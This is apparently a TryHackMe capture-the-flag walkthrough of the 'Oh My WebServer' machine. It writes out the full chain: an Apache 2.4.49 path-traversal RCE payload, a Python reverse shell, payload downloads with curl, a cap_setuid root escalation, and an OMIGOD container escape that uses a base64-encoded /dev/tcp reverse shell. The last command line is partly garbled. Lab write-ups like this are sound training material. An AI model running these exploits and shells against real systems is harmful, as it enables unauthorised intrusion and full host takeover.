---
title: "TryHackMe - Oh My WebServer CTF Walkthrough"
date: 2026-02-27
categories: [Writeups]
tags: [Writeups, TryHackMe]
image:
  path: /assets/img/posts/tryhackme/oh-my-webserver/c1833021c98fa6c74fc125f4b34741ca.png
---

![image.png](/assets/img/posts/tryhackme/oh-my-webserver/image.png)

## Introduction

This machine demonstrates a complete compromise chain starting from a vulnerable web service and ending with full root access on the host system. The attack progresses through web exploitation, container privilege escalation, internal enumeration, and ultimately a container escape via a vulnerable management service.

## Enumeration

To provide a structured overview of the target's attack surface, the process began with a comprehensive scan of all network entry points.

### Port Enumeration

The enumeration phase began with a full TCP scan of the target.

```bash
$ nmap 10.81.154.53 -p- -sT -T5 -vvv
```

**Results**

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

The scan revealed two open ports: 22 running SSH and 80 running HTTP. 

### Service Enumeration

Service version detection was then performed.

```bash
$ nmap 10.81.154.53 -p 22,80 -sV -T5 -vvv
```

**Results**

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.49 ((Unix))
```

The web server was identified as Apache 2.4.49. This version immediately stood out because it is affected by critical path traversal and remote code execution vulnerabilities.

## RCE Exploitation

The target was running **Apache HTTP Server version 2.4.49**, which is vulnerable to CVE-2021-41773 and CVE-2021-42013. 

<aside>
⚠️

These vulnerabilities are caused by improper path normalization, allowing an attacker to bypass directory traversal protections. Under certain configurations, this can lead to remote command execution.

</aside>

A public proof-of-concept exploit is available at:

[https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)

After downloading the PoC, it was executed against the target:

```bash
$ python3 exploit.py 10.81.154.53 80 rce 'id'
```

The exploit successfully confirmed that the host was vulnerable and returned command execution:

```bash
[i] Host appears to be vulnerable.
[*] Working Payload: http://10.81.154.53:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh

$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

At this stage, remote code execution was achieved as the `daemon` user.

Since the initial shell was limited and not fully interactive, a reverse shell was established to gain a more stable session.

First, a listener was started on the attacking machine:

```bash
$ nc -lvnp 4444
```

Then a Python reverse shell was executed on the target:

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.211.0",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

The connection was received successfully:

```
connect to [192.168.211.0] from (UNKNOWN) [10.81.154.53] 51682
```

After upgrading the shell to a proper TTY using Python’s `pty` module, the session became fully interactive:

```bash
daemon@4a70924bafa0:/bin$
```

At this point, enumeration began. The `/home` directory was empty, and nothing of immediate value was found in the Apache directories. The expected flag was not present in common locations.

However, while inspecting the root directory, an important detail was discovered: the presence of the `.dockerenv` file.

```bash
-rwxr-xr-x   1 root root    0 Feb 23  2022 .dockerenv
```

The `.dockerenv` file is a strong indicator that the current environment is a Docker container rather than the host system itself. 

## Privilege Escalation

To identify potential vectors for gaining higher-level access, the focus shifted toward automated vulnerability discovery.

### LinPEAS Enumeration

To perform deeper privilege escalation checks, LinPEAS was transferred to the target machine using a simple Python HTTP server on the attacker side.

```bash
$ python3 -m http.server
```

From the target:

```bash
cd /tmp
curl http://192.168.211.0:8000/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS confirmed that we were indeed inside a Docker container. 

![image.png](/assets/img/posts/tryhackme/oh-my-webserver/image%201.png)

More importantly, it revealed a critical finding:

```bash
/usr/bin/python3.7 = cap_setuid+ep
```

This meant that the Python 3.7 binary had the `cap_setuid` capability enabled.

### Linux Capabilities Exploitation

The `cap_setuid` capability allows a process to change its effective user ID. 

<aside>
⚠️

In practical terms, this means that even though we were running as the `daemon` user, we could use Python to switch our UID to 0.

</aside>

This was exploited with the following command:

```bash
python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Immediately, the prompt changed to root:

```bash
root@4a70924bafa0:/tmp# id
uid=0(root) gid=1(daemon) groups=1(daemon)
```

With root access in the container, the first flag was retrieved from `/root/user.txt`.

```bash
root@4a70924bafa0:/root# cat user.txt
THM{REDACTED}
```

## Container Escape

Although we now had root privileges, we were still confined to the Docker container. The next objective was escaping to the host system.

The `ss` command was unavailable, so a static `nmap` binary was transferred to perform internal network enumeration.

```bash
curl http://192.168.211.0:8000/nmap -o nmap
chmod +x nmap
```

Checking the network configuration revealed the container IP address:

```bash
root@4a70924bafa0:/root# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 173194  bytes 34859079 (33.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 176983  bytes 72749742 (69.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 262322  bytes 11017528 (10.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 262322  bytes 11017528 (10.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

In typical Docker setups, containers are connected to a virtual bridge (`docker0`), and the host is reachable via the gateway address, usually `172.17.0.1`.

A port scan was performed against the gateway:

```bash
./nmap 172.17.0.1 -p- --min-rate 5000
```

**Results**

```
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
```

The results showed port 5986 open.

Port 5986 is commonly associated with WinRM, but since the host was Ubuntu, this strongly suggested the presence of Open Management Infrastructure.

### OMIGOD Exploitation

OMI is known to be vulnerable to CVE-2021-38647, also known as OMIGOD. This vulnerability allows unauthenticated remote command execution as root.

A public exploit for CVE-2021-38647 can be found at:

[https://github.com/AlteredSecurity/CVE-2021-38647/blob/main/CVE-2021-38647.py](https://github.com/AlteredSecurity/CVE-2021-38647/blob/main/CVE-2021-38647.py)

The exploit was transferred to the container:

```bash
curl http://192.168.211.0:8000/omigod.py -o omigod.py
chmod +x omigod.py
```

The exploit was executed against the host and the result confirmed root execution on the host:

```bash
root@4a70924bafa0:/tmp# python3 omigod.py -t 172.17.0.1 -p 5986 -c id
python3 omigod.py -t 172.17.0.1 -p 5986 -c id
uid=0(root) gid=0(root) groups=0(root)
```

With remote root execution confirmed, the focus shifted to establishing a stable, interactive shell. To circumvent complex quoting and character escaping issues, the reverse shell payload was delivered as a **Base64-encoded** string. 

```bash
root@4a70924bafa0:/tmp# python3 omigod.py -t 172.17.0.1 -p 5986 -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxMS4wLzQ0NDUgMD4mMQo= | base64 -d | bash" <TIuMTY4LjIxMS4wLzQ0NDUgMD4mMQo= | base64 -d | bash"
```

Upon execution, the listener caught a connection that verified full, uncontained root access to the host system:

```bash
root@ubuntu:/var/opt/microsoft/scx/tmp#
```

Verifying privileges:

```bash
uid=0(root) gid=0(root) groups=0(root)
```

Finally, the root flag was retrieved from `/root/root.txt`.

```bash
root@ubuntu:/root# cat root.txt	
THM{REDACTED}
```
